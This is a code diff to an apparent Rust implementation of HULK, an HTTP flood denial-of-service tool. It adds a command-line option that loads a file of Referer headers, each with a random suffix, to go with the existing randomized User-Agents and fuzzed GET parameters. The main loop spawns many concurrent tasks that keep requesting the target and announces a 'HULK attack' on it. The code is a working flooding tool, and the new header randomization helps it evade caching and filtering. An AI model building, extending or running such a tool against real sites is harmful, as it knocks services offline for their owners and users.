@@ -47,12 +47,15 @@ struct CliArguments {
     /// verbose mode (display HTTP error codes)
     #[clap(short, long, takes_value = false, required = false)]
     verbose: bool,
-    /// File containing list of user agents to use
+    /// File containing a list of user agents to use
     #[clap(short, takes_value = true, required = false)]
     user_agents_file: Option<String>,
     /// Name of a GET parameter to add to the request (the value will be fuzzed, instead of fuzzing both the name of a GET parameter and its value)
     #[clap(short, takes_value = true, required = false)]
     parameter_name: Option<String>,
+    /// File containing a list of Referers to use (a random string will be appended to each Referer)
+    #[clap(short, takes_value = true, required = false)]
+    referers_file: Option<String>,
 }
 
 fn lines_from_file(filename: impl AsRef<Path> + std::marker::Copy) -> Vec<String> {
@@ -76,27 +79,28 @@ fn random_string(n: usize) -> String {
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let args = CliArguments::parse();
-
-    // let tasks = (0..args.max_connections).map(|x| {
-    //     fetch_url(args.target.clone(), x)
-    // });
-    // join_all(tasks).await;
     let user_agents = if let Some(user_agents_file) = args.user_agents_file {
         lines_from_file(user_agents_file.as_str())
     } else {
         USER_AGENTS.iter().map(|x| x.to_string()).collect()
     };
+    let referers = if let Some(referers_file) = args.referers_file {
+        lines_from_file(referers_file.as_str())
+    } else {
+        REFERERS.iter().map(|x| x.to_string()).collect()
+    };
     println!("[*] Starting HULK attack on {}", args.target);
-    let tasks = (0..args.max_connections).map(|x| {
+    let tasks = (0..args.max_connections).map(|_| {
+        // clone the arguments to pass to the task since we are move-ing them
         let target = args.target.clone();
         let parameter_name = args.parameter_name.clone();
         let user_agents = user_agents.clone();
+        let referers = referers.clone();
         tokio::spawn(async move {
-            fetch_url(target, args.verbose, parameter_name, user_agents, x).await
+            fetch_url(target, args.verbose, parameter_name, user_agents, referers).await
         })
     });
     join_all(tasks).await;
-
     Ok(())
 }
 
@@ -105,7 +109,7 @@ async fn fetch_url(
     verbose: bool,
     parameter_name: Option<String>,
     user_agents: Vec<String>,
-    _thread: usize,
+    referers: Vec<String>,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
     let https = HttpsConnector::new();
     let client = Client::builder().build::<_, hyper::Body>(https);
@@ -132,14 +136,15 @@ async fn fetch_url(
         };
         let referer = format!(
             "{}{}",
-            REFERERS[rand::thread_rng().gen_range(0..REFERERS.len())],
+            referers[rand::thread_rng().gen_range(0..referers.len())],
             random_string(rand::thread_rng().gen_range(5..10))
         );
         let user_agent = user_agents[rand::thread_rng().gen_range(0..user_agents_len)].clone();
         let request = Request::get(uri)
             .header("User-Agent", user_agent)
             .header("Referer", referer)
-            .body(Body::empty()).unwrap();
+            .body(Body::empty())
+            .unwrap();
 
         let resp = client.request(request).await;
         // Do not return on error, to allow keeping the max number of tasks running
@@ -157,7 +162,7 @@ async fn fetch_url(
             ERR_COUNT.fetch_add(1, Ordering::Relaxed);
         }
         let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed) + 1;
-        if total_reqs % 100 == 0 {
+        if total_reqs % 100 == 1 {
             let err_count = ERR_COUNT.load(Ordering::Relaxed);
             // sometimes the error count is higher than total requests
             // so we need to check for that not to get a substract with overflow
@@ -168,7 +173,10 @@ async fn fetch_url(
             };
             print!(
                 "\r[*] {} requests | {} OK | {} server errors | {} failed requests",
-                total_reqs, ok_count, err_count, FAIL_COUNT.load(Ordering::Relaxed)
+                total_reqs,
+                ok_count,
+                err_count,
+                FAIL_COUNT.load(Ordering::Relaxed)
             );
             io::stdout().flush().unwrap();
         }
